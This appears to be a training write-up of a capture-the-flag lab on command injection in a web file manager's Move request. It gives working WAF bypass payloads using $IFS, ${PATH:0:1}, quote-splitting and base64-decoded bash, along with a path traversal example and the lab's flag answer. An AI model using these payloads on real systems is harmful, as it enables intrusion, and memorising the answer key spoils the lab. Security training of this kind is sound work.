# Command Injections — Skills Assessment

## ID
540

## Module
Command Injections

## Kind
lab

## Title
Skills Assessment — Web File Manager Command Injection

## Description
Exploit a command injection vulnerability in a web-based file manager's Move functionality, bypassing character filters and whitespace restrictions to read `/flag.txt`.

## Tags
command-injection, filter-bypass, burp-suite, whitespace-bypass, slash-bypass, web-app

## Commands
- `$IFS%26c"a"t$IFS${PATH:0:1}flag.txt` — payload injected into the `to` GET parameter to read the flag
- `$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)` — alternative base64-encoded payload bypassing multiple filters
- `echo 'cat /flag.txt' | base64` — generate the base64 string (`Y2F0IC9mbGFnLnR4dA==`) used in the bash payload
- `%26` — URL-encoded `&` operator, the only injection operator not blocked by the WAF

## What This Section Covers
This skills assessment requires chaining multiple command injection techniques — identifying the injectable parameter, choosing a non-blocked operator, and bypassing whitespace and slash filters — against a real web file manager. It pulls together everything from the module: injection discovery via error-based feedback, operator selection, and character-level filter evasion.

## Methodology
1. Log into the file manager at `http://<TARGET>:<PORT>` with `guest:guest`
2. Explore the UI — identify interactive functionality: Preview, Copy to, Direct link, Download
3. Test the **Move** functionality — it calls a backend `mv` command and prints errors on failure, confirming OS command execution
4. Intercept the Move request in Burp Suite and send to Repeater
5. Identify the two GET parameters: `to` (destination) and `from` (source filename)
6. Test injection operators in both parameters — most are blocked by a WAF ("Malicious request denied!")
7. Discover that `&` (URL-encoded as `%26`) is **whitelisted** because the backend assumes it's a URL query separator
8. Bypass the whitespace filter using `$IFS` (Internal Field Separator) or `%09` (tab)
9. Bypass the slash `/` filter using `${PATH:0:1}` (extracts `/` from the `$PATH` environment variable)
10. Bypass potential keyword filters by inserting quotes mid-command: `c"a"t` instead of `cat`
11. Inject the final payload into the `to` parameter and read the flag

## Multi-step Workflow (Payload Construction)

### Payload A — Direct with $IFS and ${PATH:0:1}
```
/index.php?to=tmp$IFS%26c"a"t$IFS${PATH:0:1}flag.txt&from=<FILENAME>&finish=1&move=1
```

### Payload B — Base64-encoded via bash heredoc
```
# First, generate the base64:
echo 'cat /flag.txt' | base64
# Output: Y2F0IC9mbGFnLnR4dA==

# Then inject:
/index.php?to=tmp$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=<FILENAME>&finish=1&move=1
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| What is the content of '/flag.txt'? | HTB{c0mm4nd3r_1nj3c70r} | Injected payload into `to` parameter of the Move request |

## Key Takeaways
- **Error messages are gold** — the `mv` error output confirmed OS-level command execution and gave feedback on payload success/failure
- **Not all operators are filtered equally** — `&` was whitelisted because it's a legitimate URL character; always test every operator individually (`; | || && & \n`)
- **$IFS is the go-to whitespace bypass** — when spaces are filtered, `$IFS` (defaults to space/tab/newline) replaces them cleanly
- **${PATH:0:1} extracts `/` from the environment** — Bash substring syntax lets you pull any character from existing env vars, bypassing slash filters without needing the literal character
- **Quote injection breaks keyword filters** — `c"a"t` evaluates to `cat` but doesn't match a naive regex for "cat"; also works with single quotes (`c'a't`) or `$@` insertion (`c$@at`)
- **Base64 payloads are the nuclear option** — when multiple characters are filtered, encoding the entire command and decoding at runtime via `bash<<<$(base64 -d<<<...)` bypasses almost everything

## Gotchas
- **The `mv` command must fail for output to appear** — if the move succeeds silently, you won't see your injected command's output; don't select a valid destination folder
- **`&&` doesn't work here** — it only runs the second command if the first succeeds, and since we need the `mv` to fail, `&&` would suppress our payload; `&` runs both regardless
- **URL-encode the `&` as `%26`** — a raw `&` in the URL is interpreted as a query parameter separator by the browser/server, not as a shell operator
- **The `from` parameter is also injectable** — but `to` is the standard choice because it's the destination argument where arbitrary input is more expected

## Why the Move Functionality and Not Other Vectors

### Why not the Search bar?
Search bars typically query a **database** (SQL) or filter filenames **in-memory** within the application. They rarely pass user input directly to an OS-level command. Even if a search bar were vulnerable, it would more likely be SQL injection or a logic flaw, not command injection. There's no reason for a search feature to invoke shell commands.

### Why not Preview / Direct Link / Download?
These buttons perform **read-only file operations** — they serve a file's contents, generate a URL, or stream bytes to the browser. Internally, they use language-level file I/O (like PHP's `readfile()` or `file_get_contents()`), not shell commands. They might be vulnerable to **path traversal** (e.g., `../../../../etc/passwd`), but not command injection.

### Why not Copy to?
Copy (`cp`) is actually a reasonable candidate and was tested first. However, in this application, the `Copy to` functionality **did not return error messages or any command output**, making blind injection the only option — which is harder to confirm and exploit. Without feedback, you can't tell if your injection ran.

### Why Move specifically?
The **Move** functionality stood out for three critical reasons:
1. **It uses `mv` — an OS-level command** — file managers that move files often shell out to `mv` or `move` rather than using language-level rename functions, especially when moving across filesystems
2. **It prints error messages** — when the `mv` command fails (e.g., no destination specified), the raw error string is reflected in the HTTP response, confirming shell execution and giving you output for your injected commands
3. **Error-based output = easy exfiltration** — because the error channel reflects command output, any injected command's stdout/stderr gets embedded in the response, turning a blind injection into a visible one
